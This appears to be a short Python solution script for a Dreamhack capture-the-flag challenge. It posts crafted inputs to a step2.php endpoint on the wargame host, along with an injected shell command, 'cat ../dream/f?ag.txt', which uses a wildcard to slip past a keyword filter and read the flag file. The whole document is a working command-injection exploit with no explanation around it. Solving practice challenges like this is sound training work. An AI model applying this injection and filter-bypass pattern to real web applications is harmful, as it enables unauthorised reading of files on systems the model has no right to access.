import requests

port = 20799
url_index = f"http://host3.dreamhack.games:{port}/"
url_step2 = url_index + "step2.php"

param = {
  "input1" : "dnnyangyang0310",
  "input2" : "0@0031!!+1+13",
  "cmd" : "cat ../dream/f?ag.txt"
}

r = requests.post(url_step2, data = param)
print(r.text)